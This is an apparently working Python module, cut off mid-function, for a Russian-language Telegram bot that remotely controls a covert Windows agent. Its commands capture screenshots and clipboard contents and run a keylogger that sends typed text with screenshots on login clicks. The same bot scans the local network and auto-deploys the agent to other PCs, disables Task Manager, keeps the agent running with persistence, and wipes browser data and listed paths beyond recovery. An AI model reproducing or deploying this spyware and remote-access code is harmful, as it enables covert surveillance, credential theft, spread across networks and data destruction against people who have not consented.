"""Telegram bot — full admin interface for the agent.

Only the configured admin Telegram user ID can interact.
The bot runs in a background thread using asyncio.

Commands:
  /start, /help          — list commands
  /status                — agent info
  /screen                — take screenshot now
  /apps [days]           — top apps by time
  /events [n]            — last n events
  /processes             — running processes
  /kill <name>           — kill process
  /block <name>          — block process
  /unblock <name>        — unblock
  /blocklist             — show blocklist
  /lock                  — lock workstation (Win lock)
  /lockscreen <pwd>      — full-screen lock with password
  /unlockscreen          — remove full-screen lock
  /logoff                — log off
  /shutdown [sec]        — schedule shutdown
  /restart [sec]         — schedule restart
  /message <text>        — show popup on screen
  /usb                   — connected USB drives
  /clipboard [n]         — last clipboard entries
  /software              — installed software count
  /set interval <sec>    — screenshot interval
  /set tracking on|off   — toggle tracking
  /set block on|off      — toggle blocker
  /set usb on|off        — toggle USB monitor
  /set clipboard on|off  — toggle clipboard monitor
  /config                — show config
  /pause / /resume       — pause/resume monitoring
  /autostart on|off      — install/remove auto-start
  /integrity             — check binary integrity
"""
from __future__ import annotations

import asyncio
import io
import logging
import os
import platform
import socket
import subprocess
import sys
import threading
import time
from datetime import datetime, timedelta
from typing import TYPE_CHECKING, Any, Optional

try:
    import psutil
except ImportError:
    psutil = None

log = logging.getLogger("monitor.agent.telegram")

if TYPE_CHECKING:
    from .main import AgentCore

CREATE_NO_WINDOW = getattr(subprocess, "CREATE_NO_WINDOW", 0x08000000)

# will be set by main before starting the bot
_agent: Optional["AgentCore"] = None


def set_agent(agent: "AgentCore") -> None:
    global _agent
    _agent = agent


# ----- bot startup -----

_bot_thread: Optional[threading.Thread] = None
_loop: Optional[asyncio.AbstractEventLoop] = None


def start_bot(token: str, admin_id: int) -> None:
    global _bot_thread
    _bot_thread = threading.Thread(
        target=_run_bot, args=(token, admin_id), name="telegram", daemon=True
    )
    _bot_thread.start()


def _run_bot(token: str, admin_id: int) -> None:
    global _loop
    _loop = asyncio.new_event_loop()
    asyncio.set_event_loop(_loop)
    _loop.run_until_complete(_async_bot(token, admin_id))


async def _async_bot(token: str, admin_id: int) -> None:
    from telegram import Update, BotCommand
    from telegram.ext import (
        ApplicationBuilder,
        CommandHandler,
        ContextTypes,
        MessageHandler,
        filters,
    )

    app = ApplicationBuilder().token(token).build()

    # ----- admin-only decorator -----
    def admin_only(func):
        async def wrapper(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
            if update.effective_user and update.effective_user.id != admin_id:
                await update.message.reply_text("⛔ Доступ запрещён.")
                return
            return await func(update, ctx)
        return wrapper

    # ----- handlers -----

    @admin_only
    async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        for page in HELP_PAGES:
            await update.message.reply_text(page, parse_mode="HTML")

    @admin_only
    async def cmd_status(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        a = _agent
        if not a:
            await update.message.reply_text("Агент не инициализирован")
            return
        cfg = a.config
        boot = datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M")
        mem = psutil.virtual_memory()
        disk = psutil.disk_usage("C:\\")
        uptime = str(timedelta(seconds=int(time.time() - psutil.boot_time())))
        text = (
            f"<b>🖥 {socket.gethostname()}</b> / {os.environ.get('USERNAME', '?')}\n"
            f"OS: {platform.system()} {platform.release()} ({platform.machine()})\n"
            f"Uptime: {uptime} (boot: {boot})\n"
            f"RAM: {mem.used // (1024**2)} / {mem.total // (1024**2)} MB ({mem.percent}%)\n"
            f"Disk C: {disk.used // (1024**3)} / {disk.total // (1024**3)} GB ({disk.percent}%)\n"
            f"CPU: {psutil.cpu_percent(interval=1)}%\n\n"
            f"Трекинг: {'▶️ ВКЛ' if cfg.tracking_enabled and not cfg.paused else '⏸ ВЫКЛ'}\n"
            f"Скриншоты: каждые {cfg.screenshot_interval}с\n"
            f"Блокировка: {'ВКЛ' if cfg.block_enabled else 'ВЫКЛ'}\n"
            f"USB монитор: {'ВКЛ' if cfg.usb_monitor_enabled else 'ВЫКЛ'}\n"
            f"Буфер обмена: {'ВКЛ' if cfg.clipboard_monitor_enabled else 'ВЫКЛ'}\n"
            f"Автозапуск: {'ВКЛ' if _is_autostart() else 'ВЫКЛ'}\n"
            f"Заблокировано процессов: {len(cfg.blocked_processes)}\n"
        )
        await update.message.reply_text(text, parse_mode="HTML")

    @admin_only
    async def cmd_screen(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        from . import screenshot
        data = screenshot.take_jpeg(quality=75)
        if not data:
            await update.message.reply_text("❌ Не удалось сделать скриншот")
            return
        await update.message.reply_photo(
            photo=io.BytesIO(data),
            caption=f"📸 {datetime.now().strftime('%H:%M:%S')}",
        )

    @admin_only
    async def cmd_apps(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        a = _agent
        if not a or not a.aggregator:
            await update.message.reply_text("Нет данных")
            return
        batch = a.aggregator.take_batch(force=True)
        if not batch:
            await update.message.reply_text("Нет активности")
            return
        apps: dict[str, int] = {}
        for ev in batch:
            apps[ev.get("app", "?")] = apps.get(ev.get("app", "?"), 0) + ev.get("duration", 0)
        lines = sorted(apps.items(), key=lambda kv: kv[1], reverse=True)[:20]
        text = "<b>📊 Использование приложений</b>\n\n"
        for name, sec in lines:
            m, s = divmod(sec, 60)
            text += f"• <b>{_esc(name)}</b> — {m}м {s}с\n"
        await update.message.reply_text(text, parse_mode="HTML")

    @admin_only
    async def cmd_processes(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        if not psutil:
            await update.message.reply_text("psutil not available")
            return
        procs = []
        for p in psutil.process_iter(attrs=["pid", "name", "memory_info", "cpu_percent"]):
            try:
                info = p.info
                mem_mb = (info.get("memory_info") or p.memory_info()).rss / (1024 * 1024)
                procs.append((info["name"], info["pid"], mem_mb))
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
        procs.sort(key=lambda x: x[2], reverse=True)
        lines = [f"<b>📋 Top 30 процессов</b>\n"]
        for name, pid, mem in procs[:30]:
            lines.append(f"• {_esc(name)} (PID {pid}) — {mem:.0f} MB")
        await update.message.reply_text("\n".join(lines), parse_mode="HTML")

    @admin_only
    async def cmd_kill(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        if not psutil:
            await update.message.reply_text("psutil not available")
            return
        args = _args(update)
        if not args:
            await update.message.reply_text("Использование: /kill <process.exe>")
            return
        target = args.lower()
        killed = 0
        for p in psutil.process_iter(attrs=["name", "pid"]):
            try:
                if (p.info["name"] or "").lower() == target:
                    p.kill()
                    killed += 1
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
        await update.message.reply_text(f"Завершено процессов: {killed}")

    @admin_only
    async def cmd_block(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        args = _args(update)
        if not args:
            await update.message.reply_text("Использование: /block <process.exe>")
            return
        a = _agent
        if a:
            proc = args.lower().strip()
            if proc not in a.config.blocked_processes:
                a.config.blocked_processes.append(proc)
                a.config.save()
            await update.message.reply_text(f"✅ {proc} добавлен в блок-лист")

    @admin_only
    async def cmd_unblock(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        args = _args(update)
        if not args:
            await update.message.reply_text("Использование: /unblock <process.exe>")
            return
        a = _agent
        if a:
            proc = args.lower().strip()
            if proc in a.config.blocked_processes:
                a.config.blocked_processes.remove(proc)
                a.config.save()
                await update.message.reply_text(f"✅ {proc} убран из блок-листа")
            else:
                await update.message.reply_text(f"❌ {proc} не в списке")

    @admin_only
    async def cmd_blocklist(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        a = _agent
        if not a or not a.config.blocked_processes:
            await update.message.reply_text("Блок-лист пуст")
            return
        text = "<b>🚫 Заблокированные процессы:</b>\n\n"
        for p in a.config.blocked_processes:
            text += f"• {_esc(p)}\n"
        await update.message.reply_text(text, parse_mode="HTML")

    @admin_only
    async def cmd_lock(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        from . import screen_lock
        screen_lock.lock_workstation()
        await update.message.reply_text("🔒 Рабочая станция заблокирована")

    @admin_only
    async def cmd_lockscreen(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        from . import screen_lock
        args = _args(update)
        pwd = args if args else "admin"
        ok = screen_lock.lock_screen_full(pwd, "Компьютер заблокирован администратором")
        if ok:
            await update.message.reply_text(f"🔒 Экран заблокирован (пароль: {pwd})")
        else:
            await update.message.reply_text("Экран уже заблокирован")

    @admin_only
    async def cmd_unlockscreen(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        from . import screen_lock
        ok = screen_lock.unlock_screen()
        await update.message.reply_text("🔓 Экран разблокирован" if ok else "Экран не был заблокирован")

    @admin_only
    async def cmd_logoff(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        await update.message.reply_text("👋 Выход из системы через 5 секунд...")
        if sys.platform == "win32":
            subprocess.Popen(["shutdown", "/l"], creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0))

    @admin_only
    async def cmd_shutdown(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        args = _args(update)
        sec = int(args) if args and args.isdigit() else 30
        await update.message.reply_text(f"⚠️ Выключение через {sec} секунд")
        if sys.platform == "win32":
            subprocess.Popen(
                ["shutdown", "/s", "/t", str(sec)],
                creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0),
            )

    @admin_only
    async def cmd_restart(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        args = _args(update)
        sec = int(args) if args and args.isdigit() else 30
        await update.message.reply_text(f"🔄 Перезагрузка через {sec} секунд")
        if sys.platform == "win32":
            subprocess.Popen(
                ["shutdown", "/r", "/t", str(sec)],
                creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0),
            )

    @admin_only
    async def cmd_message(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        args = _args(update)
        if not args:
            await update.message.reply_text("Использование: /message <текст>")
            return
        import ctypes as ct
        def _show():
            try:
                ct.windll.user32.MessageBoxW(
                    0, args, "Сообщение администратора",
                    0x0 | 0x40 | 0x10000 | 0x40000,
                )
            except Exception:
                pass
        threading.Thread(target=_show, daemon=True).start()
        await update.message.reply_text(f"💬 Сообщение отправлено: {args[:100]}")

    @admin_only
    async def cmd_usb(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        from .usb_monitor import get_usb_drives
        drives = get_usb_drives()
        if not drives:
            await update.message.reply_text("USB-накопители не обнаружены")
            return
        text = "<b>🔌 USB-накопители:</b>\n\n"
        for d in drives:
            text += f"• {_esc(d['device'])} [{d['letter']}] — {d['size_gb']} GB (SN: {d['serial'][:12]})\n"
        await update.message.reply_text(text, parse_mode="HTML")

    @admin_only
    async def cmd_clipboard(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        a = _agent
        if not a or not a.clip_monitor:
            await update.message.reply_text("Мониторинг буфера обмена выключен")
            return
        args = _args(update)
        n = int(args) if args and args.isdigit() else 5
        entries = a.clip_monitor.get_last(n)
        if not entries:
            await update.message.reply_text("Буфер пуст")
            return
        text = "<b>📋 Последние записи буфера:</b>\n\n"
        for e in entries:
            ts = e.ts.strftime("%H:%M:%S")
            text += f"<b>{ts}</b>: <code>{_esc(e.text[:200])}</code>\n\n"
        await update.message.reply_text(text, parse_mode="HTML")

    @admin_only
    async def cmd_software(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        a = _agent
        cnt = a.soft_monitor.get_installed_count() if a and a.soft_monitor else 0
        await update.message.reply_text(f"📦 Установлено программ: {cnt}")

    @admin_only
    async def cmd_set(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        a = _agent
        if not a:
            return
        args = _args(update)
        if not args:
            await update.message.reply_text(
                "Использование:\n"
                "/set interval 60\n"
                "/set tracking on|off\n"
                "/set block on|off\n"
                "/set usb on|off\n"
                "/set clipboard on|off\n"
                "/set keylogger on|off\n"
                "/set autodeploy on|off"
            )
            return
        parts = args.split(maxsplit=1)
        key = parts[0].lower()
        val = parts[1].strip() if len(parts) > 1 else ""
        cfg = a.config
        if key == "interval":
            cfg.screenshot_interval = max(0, int(val or "0"))
        elif key == "tracking":
            cfg.tracking_enabled = val.lower() in ("on", "1", "true", "да")
        elif key == "block":
            cfg.block_enabled = val.lower() in ("on", "1", "true", "да")
        elif key == "usb":
            cfg.usb_monitor_enabled = val.lower() in ("on", "1", "true", "да")
        elif key == "clipboard":
            cfg.clipboard_monitor_enabled = val.lower() in ("on", "1", "true", "да")
        elif key == "autodeploy":
            cfg.auto_deploy_enabled = val.lower() in ("on", "1", "true", "да")
        elif key == "keylogger":
            cfg.keylogger_enabled = val.lower() in ("on", "1", "true", "да")
        else:
            await update.message.reply_text(f"Неизвестный параметр: {key}")
            return
        cfg.save()
        await update.message.reply_text(f"✅ {key} = {val}")

    @admin_only
    async def cmd_config(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        a = _agent
        if not a:
            return
        cfg = a.config
        text = (
            f"<b>⚙️ Конфигурация</b>\n\n"
            f"Скриншоты: каждые {cfg.screenshot_interval}с\n"
            f"Трекинг: {'ВКЛ' if cfg.tracking_enabled else 'ВЫКЛ'}\n"
            f"Пауза: {'да' if cfg.paused else 'нет'}\n"
            f"Блокировка: {'ВКЛ' if cfg.block_enabled else 'ВЫКЛ'}\n"
            f"USB: {'ВКЛ' if cfg.usb_monitor_enabled else 'ВЫКЛ'}\n"
            f"Буфер обмена: {'ВКЛ' if cfg.clipboard_monitor_enabled else 'ВЫКЛ'}\n"
            f"ПО монитор: {'ВКЛ' if cfg.software_monitor_enabled else 'ВЫКЛ'}\n"
            f"Кейлоггер: {'ВКЛ' if cfg.keylogger_enabled else 'ВЫКЛ'}\n"
            f"Автозапуск: {'ВКЛ' if _is_autostart() else 'ВЫКЛ'}\n"
            f"Авто-деплой: {'ВКЛ' if cfg.auto_deploy_enabled else 'ВЫКЛ'}\n"
            f"Wipe-список: {len(cfg.wipe_paths)} путей\n"
            f"Блок-лист: {', '.join(cfg.blocked_processes) or '—'}\n"
        )
        await update.message.reply_text(text, parse_mode="HTML")

    @admin_only
    async def cmd_pause(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        a = _agent
        if a:
            a.config.paused = True
            a.config.save()
        await update.message.reply_text("⏸ Мониторинг приостановлен")

    @admin_only
    async def cmd_resume(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        a = _agent
        if a:
            a.config.paused = False
            a.config.save()
        await update.message.reply_text("▶️ Мониторинг возобновлён")

    @admin_only
    async def cmd_autostart(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        from . import protection
        args = _args(update)
        if not args:
            status = "ВКЛ" if protection.is_autostart_installed() else "ВЫКЛ"
            await update.message.reply_text(
                f"Автозапуск: {status}\nИспользование: /autostart on | off"
            )
            return
        if args.lower() in ("on", "1", "true"):
            ok = protection.install_autostart()
            await update.message.reply_text("✅ Автозапуск установлен" if ok else "❌ Ошибка")
        else:
            ok = protection.remove_autostart()
            await update.message.reply_text("✅ Автозапуск удалён" if ok else "❌ Ошибка")

    @admin_only
    async def cmd_integrity(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        from . import protection
        h = protection.get_exe_hash()
        p = protection.get_exe_path()
        await update.message.reply_text(
            f"<b>🔐 Integrity check</b>\n"
            f"Path: <code>{_esc(p)}</code>\n"
            f"SHA-256: <code>{h}</code>",
            parse_mode="HTML",
        )

    @admin_only
    async def cmd_deploy(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        """Manually trigger auto-deploy to LAN PCs."""
        from .auto_deploy import auto_deploy
        await update.message.reply_text("🚀 Запуск развёртывания на все ПК в сети...")

        def _run():
            progress_msgs = []
            def on_prog(msg):
                progress_msgs.append(msg)
            return auto_deploy(on_progress=on_prog)

        loop = asyncio.get_event_loop()
        result = await loop.run_in_executor(None, _run)
        text = f"<b>🚀 Развёртывание завершено</b>\n\n{result.summary()}\n\n"
        for d in result.details[-15:]:
            text += f"• {_esc(d)}\n"
        await update.message.reply_text(text, parse_mode="HTML")

    @admin_only
    async def cmd_discover(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        """Scan local network for online PCs."""
        await update.message.reply_text("🔍 Сканирую локальную сеть... (до 30 сек)")

        def _scan():
            import concurrent.futures
            results = []
            my_name = socket.gethostname().lower()
            # detect subnet
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))
                my_ip = s.getsockname()[0]
                s.close()
            except Exception:
                return []
            parts = my_ip.split(".")
            subnet = f"{parts[0]}.{parts[1]}.{parts[2]}"

            def ping(ip):
                try:
                    r = subprocess.run(
                        ["ping", "-n", "1", "-w", "500", ip],
                        capture_output=True, creationflags=CREATE_NO_WINDOW,
                    )
                    if r.returncode == 0:
                        try:
                            host = socket.gethostbyaddr(ip)[0]
                        except Exception:
                            host = ip
                        return {"ip": ip, "host": host}
                except Exception:
                    pass
                return None

            with concurrent.futures.ThreadPoolExecutor(max_workers=64) as pool:
                futures = {pool.submit(ping, f"{subnet}.{i}"): i for i in range(1, 255)}
                try:
                    for f in concurrent.futures.as_completed(futures, timeout=25):
                        try:
                            r = f.result()
                            if r and r["host"].lower().split(".")[0] != my_name:
                                results.append(r)
                        except Exception:
                            pass
                except concurrent.futures.TimeoutError:
                    pass
            return sorted(results, key=lambda x: x["ip"])

        loop = asyncio.get_event_loop()
        found = await loop.run_in_executor(None, _scan)

        if not found:
            await update.message.reply_text("Других ПК не найдено.")
            return
        text = f"<b>🌐 Найдено {len(found)} ПК:</b>\n\n"
        for i, pc in enumerate(found, 1):
            text += f"{i}. <b>{_esc(pc['host'])}</b> — {pc['ip']}\n"
        text += "\nДля развёртывания используй deploy-lan.ps1"
        await update.message.reply_text(text, parse_mode="HTML")

    @admin_only
    async def cmd_network(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        """Show network info of this PC."""
        interfaces = []
        try:
            import psutil as ps
            addrs = ps.net_if_addrs()
            stats = ps.net_if_stats()
            for iface, addr_list in addrs.items():
                if not stats.get(iface, None) or not stats[iface].isup:
                    continue
                for addr in addr_list:
                    if addr.family.name == "AF_INET" and addr.address != "127.0.0.1":
                        interfaces.append(f"• <b>{_esc(iface)}</b>: {addr.address}")
        except Exception:
            pass
        try:
            hostname = socket.gethostname()
            ext_ip = "N/A"
        except Exception:
            hostname = "?"
        text = f"<b>🌐 Сеть</b>\n\nHostname: <code>{_esc(hostname)}</code>\n"
        if interfaces:
            text += "\n".join(interfaces)
        else:
            text += "Нет активных интерфейсов"
        await update.message.reply_text(text, parse_mode="HTML")

    @admin_only
    async def cmd_protect(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        """Show/apply protection status."""
        from . import protection
        args = _args(update)
        if args.lower() == "apply":
            results = protection.apply_full_protection()
            text = "<b>🛡 Защита применена:</b>\n\n"
            for k, v in results.items():
                emoji = "✅" if v else "❌"
                text += f"{emoji} {k}\n"
            await update.message.reply_text(text, parse_mode="HTML")
        else:
            text = (
                f"<b>🛡 Статус защиты</b>\n\n"
                f"Автозапуск (logon): {'✅' if protection.is_autostart_installed() else '❌'}\n"
                f"Приоритет: HIGH\n"
                f"ACL: ProgramData\n"
                f"Watchdog: ✅\n"
                f"ProcessGuard: ✅\n"
                f"Task Manager: {'🔒 Заблокирован' if protection.is_taskmgr_disabled() else '🔓 Доступен'}\n\n"
                f"<code>/protect apply</code> — переприменить все защиты"
            )
            await update.message.reply_text(text, parse_mode="HTML")

    @admin_only
    async def cmd_taskmgr(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        """Enable/disable Windows Task Manager remotely."""
        from . import protection
        args = _args(update)
        if not args:
            status = "🔒 Заблокирован" if protection.is_taskmgr_disabled() else "🔓 Доступен"
            await update.message.reply_text(
                f"<b>Task Manager: {status}</b>\n\n"
                f"Использование: /taskmgr on — заблокировать\n"
                f"               /taskmgr off — разблокировать",
                parse_mode="HTML",
            )
            return
        if args.lower() in ("on", "block", "disable"):
            ok = protection.disable_taskmgr()
            await update.message.reply_text("🔒 Task Manager заблокирован" if ok else "❌ Ошибка")
        elif args.lower() in ("off", "allow", "enable"):
            ok = protection.enable_taskmgr()
            await update.message.reply_text("🔓 Task Manager разблокирован" if ok else "❌ Ошибка")
        else:
            await update.message.reply_text("Использование: /taskmgr on | off")

    @admin_only
    async def cmd_autoshot(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        """Toggle auto-screenshot on Enter/mouse click."""
        a = _agent
        if not a:
            return
        args = _args(update)
        if not args:
            kb_status = "ВКЛ" if a.config.auto_screenshot_enabled else "ВЫКЛ"
            mouse_status = "ВКЛ" if a.config.auto_screenshot_mouse_enabled else "ВЫКЛ"
            await update.message.reply_text(
                f"<b>📸 Авто-скриншот</b>\n\n"
                f"Клавиатура (Enter): {kb_status}\n"
                f"Мышь (OK/Вход/Login…): {mouse_status}\n\n"
                f"Использование:\n"
                f"/autoshot on — включить Enter\n"
                f"/autoshot off — выключить Enter\n"
                f"/autoshot mouse on — включить мышь\n"
                f"/autoshot mouse off — выключить мышь",
                parse_mode="HTML",
            )
            return
        parts = args.split(maxsplit=1)
        if parts[0].lower() == "mouse":
            val = parts[1].lower() if len(parts) > 1 else ""
            if val in ("on", "1", "true"):
                a.config.auto_screenshot_mouse_enabled = True
                a.config.save()
                await update.message.reply_text("✅ Авто-скриншот мыши включён")
            elif val in ("off", "0", "false"):
                a.config.auto_screenshot_mouse_enabled = False
                a.config.save()
                await update.message.reply_text("⏸ Авто-скриншот мыши выключен")
            else:
                await update.message.reply_text("Использование: /autoshot mouse on | off")
            return
        if args.lower() in ("on", "1", "true"):
            a.config.auto_screenshot_enabled = True
            a.config.save()
            await update.message.reply_text("✅ Авто-скриншот клавиатуры включён (Enter)")
        elif args.lower() in ("off", "0", "false"):
            a.config.auto_screenshot_enabled = False
            a.config.save()
            await update.message.reply_text("⏸ Авто-скриншот клавиатуры выключен")
        else:
            await update.message.reply_text("Использование: /autoshot on | off | mouse on | off")

    @admin_only
    async def cmd_keylog(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        """Keylogger control."""
        a = _agent
        if not a:
            return
        args = _args(update)
        if not args:
            # Show current logs
            if a.keylogger:
                logs = a.keylogger.get_recent_logs(100)
                if logs:
                    text = "<b>⌨️ Последние нажатия клавиш (100):</b>\n\n"
                    text += "\n".join(logs[-100:])
                else:
                    text = "<b>⌨️ Лог клавиш</b>\n\nЛоги пусты."
            else:
                text = "<b>⌨️ Лог клавиш</b>\n\nКейлоггер отключён."
            await update.message.reply_text(text, parse_mode="HTML")
        elif args.lower() == "on":
            if not a.keylogger:
                from .config import CONFIG_DIR
                from .keylogger import Keylogger
                from . import screenshot
                def _auto_screenshot(typed_text: str):
                    try:
                        jpeg_data = screenshot.take_jpeg(quality=75)
                        if jpeg_data:
                            caption = f"📸 Auto-screenshot {datetime.now().strftime('%H:%M:%S')}"
                            if typed_text:
                                caption += f"\n⌨️ Typed: {typed_text}"
                            send_photo_alert(jpeg_data, caption=caption)
                    except Exception as exc:
                        log.warning("Auto-screenshot failed: %s", exc)
                a.keylogger = Keylogger(
                    str(CONFIG_DIR),
                    on_screenshot=_auto_screenshot,
                    keyboard_screenshot_enabled=a.config.auto_screenshot_enabled,
                    mouse_screenshot_enabled=a.config.auto_screenshot_mouse_enabled,
                )
                a.keylogger.start()
            a.config.keylogger_enabled = True
            a.config.save()
            await update.message.reply_text("✅ Кейлоггер включён")
        elif args.lower() == "off":
            if a.keylogger:
                a.keylogger.stop()
                a.keylogger = None
            a.config.keylogger_enabled = False
            a.config.save()
            await update.message.reply_text("✅ Кейлоггер отключён")
        elif args.lower() == "clear":
            if a.keylogger:
                a.keylogger.clear_logs()
            await update.message.reply_text("✅ Логи очищены")
        else:
            await update.message.reply_text("Использование: /keylog [on|off|clear]")

    @admin_only
    async def cmd_scan(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        """Scan all files on all drives."""
        await update.message.reply_text("🔄 Запуск сканирования всех дисков... Это может занять время.")

        def _run_scan():
            from .file_scanner import FileScanner
            scanner = FileScanner()
            result = scanner.scan_all_drives(min_size_mb=0, max_files=50000)
            return result

        loop = asyncio.get_event_loop()
        result = await loop.run_in_executor(None, _run_scan)

        await update.message.reply_text(result.summary(), parse_mode="HTML")

    @admin_only
    async def cmd_task(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        """Manage scheduled task."""
        from .protection import delete_task, disable_task, enable_task, task_exists

        args = _args(update)
        if not args:
            exists = task_exists()
            status = "✅ Активна" if exists else "❌ Не существует"
            await update.message.reply_text(
                f"<b>📋 Задача автозапуска</b>\n\n"
                f"Статус: {status}\n\n"
                f"<b>Управление через Telegram:</b>\n"
                f"/task delete — удалить задачу\n"
                f"/task disable — отключить задачу\n"
                f"/task enable — включить задачу\n"
                f"⚠️ Только Telegram бот может управлять задачей!",
                parse_mode="HTML",
            )
        elif args.lower() == "delete":
            if delete_task():
                await update.message.reply_text("✅ Задача удалена")
            else:
                await update.message.reply_text("❌ Не удалось удалить задачу")
        elif args.lower() == "disable":
            if disable_task():
                await update.message.reply_text("✅ Задача отключена")
            else:
                await update.message.reply_text("❌ Не удалось отключить задачу")
        elif args.lower() == "enable":
            if enable_task():
                await update.message.reply_text("✅ Задача включена")
            else:
                await update.message.reply_text("❌ Не удалось включить задачу")
        else:
            await update.message.reply_text("Использование: /task [delete|disable|enable]")

    # ─── Secure Wipe commands ───

    @admin_only
    async def cmd_wipeadd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        a = _agent
        if not a:
            return
        args = _args(update)
        if not args:
            await update.message.reply_text(
                "Использование: /wipeadd C:\\Путь\\К\\Данным\n"
                "Добавляет путь в список экстренного удаления."
            )
            return
        path = args.strip()
        if path not in a.config.wipe_paths:
            a.config.wipe_paths.append(path)
            a.config.save()
        await update.message.reply_text(f"✅ Добавлено в wipe-список: <code>{_esc(path)}</code>", parse_mode="HTML")

    @admin_only
    async def cmd_wiperemove(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        a = _agent
        if not a:
            return
        args = _args(update)
        if not args:
            await update.message.reply_text("Использование: /wiperemove C:\\Путь")
            return
        path = args.strip()
        if path in a.config.wipe_paths:
            a.config.wipe_paths.remove(path)
            a.config.save()
            await update.message.reply_text(f"✅ Удалено из wipe-списка: <code>{_esc(path)}</code>", parse_mode="HTML")
        else:
            await update.message.reply_text("❌ Путь не найден в списке")

    @admin_only
    async def cmd_wipelist(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        a = _agent
        if not a or not a.config.wipe_paths:
            await update.message.reply_text("Wipe-список пуст.\n/wipeadd для добавления.")
            return
        text = "<b>🗑 Wipe-список (экстренное удаление):</b>\n\n"
        for i, p in enumerate(a.config.wipe_paths, 1):
            exists = "✅" if os.path.exists(p) else "❌"
            text += f"{i}. {exists} <code>{_esc(p)}</code>\n"
        text += "\n/wipe all — удалить всё из списка\n/wipe &lt;путь&gt; — удалить конкретный"
        await update.message.reply_text(text, parse_mode="HTML")

    @admin_only
    async def cmd_wipe(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        from .secure_wipe import secure_wipe_path, wipe_multiple
        a = _agent
        if not a:
            return
        args = _args(update)
        if not args:
            await update.message.reply_text(
                "⚠️ <b>Безопасное удаление данных</b>\n\n"
                "/wipe all — удалить все пути из wipe-списка\n"
                "/wipe temp — удалить temp/кеш\n"
                "/wipe browsers — удалить кеш браузеров\n"
                "/wipe &lt;путь&gt; — удалить конкретный путь\n\n"
                "⚠️ ДАННЫЕ БУДУТ ПЕРЕЗАПИСАНЫ И НЕВОССТАНОВИМЫ!",
                parse_mode="HTML",
            )
            return

        await update.message.reply_text("🔥 Запускаю безопасное удаление...")

        def _do_wipe():
            if args.lower() == "all":
                if not a.config.wipe_paths:
                    return "Wipe-список пуст"
                r = wipe_multiple(a.config.wipe_paths)
                return f"<b>🗑 Wipe ALL завершён</b>\n\n{_esc(r.summary())}"
            elif args.lower() == "temp":
                from .secure_wipe import wipe_temp_and_caches
                r = wipe_temp_and_caches()
                return f"<b>🗑 Temp/кеш удалены</b>\n\n{_esc(r.summary())}"
            elif args.lower() == "browsers":
                from .secure_wipe import wipe_browser_data
                r = wipe_browser_data()
                return f"<b>🗑 Кеш браузеров удалён</b>\n\n{_esc(r.summary())}"
            else:
                r = secure_wipe_path(args.strip())
                return f"<b>🗑 Wipe завершён</b>\n\n{_esc(r.summary())}"

        loop = asyncio.get_event_loop()
        result_text = await loop.run_in_executor(None, _do_wipe)
        await update.message.reply_text(result_text, parse_mode="HTML")

    # ─── Security / Emergency commands ───

    @admin_only
    async def cmd_firewall(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        from . import security
        args = _args(update)
        if not args:
            status = security.firewall_status()
            await update.message.reply_text(
                f"<b>🔥 Firewall</b>\n<pre>{_esc(status)}</pre>\n\n"
                f"/firewall block — заблокировать ВСЁ\n"
                f"/firewall restore — восстановить по умолчанию",
                parse_mode="HTML",
            )
            return
        if args.lower() == "block":
            ok = security.firewall_block_all()
            await update.message.reply_text(
                "🔥 Firewall: ВСЕ соединения ЗАБЛОКИРОВАНЫ" if ok else "❌ Ошибка"
            )
        elif args.lower() == "restore":
            ok = security.firewall_restore_default()
            await update.message.reply_text(
                "✅ Firewall восстановлен" if ok else "❌ Ошибка"
            )
        else:
            await update.message.reply_text("Использование: /firewall block | restore")

    @admin_only
    async def cmd_disableusb(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        from . import security
        args = _args(update)
        if not args:
            status = security.usb_storage_status()
            await update.message.reply_text(
                f"<b>🔌 USB-накопители: {status}</b>\n\n"
                f"/disableusb on — заблокировать USB\n"
                f"/disableusb off — разблокировать",
                parse_mode="HTML",
            )
            return
        if args.lower() in ("on", "block", "disable"):
            ok = security.disable_usb_storage()
            await update.message.reply_text(
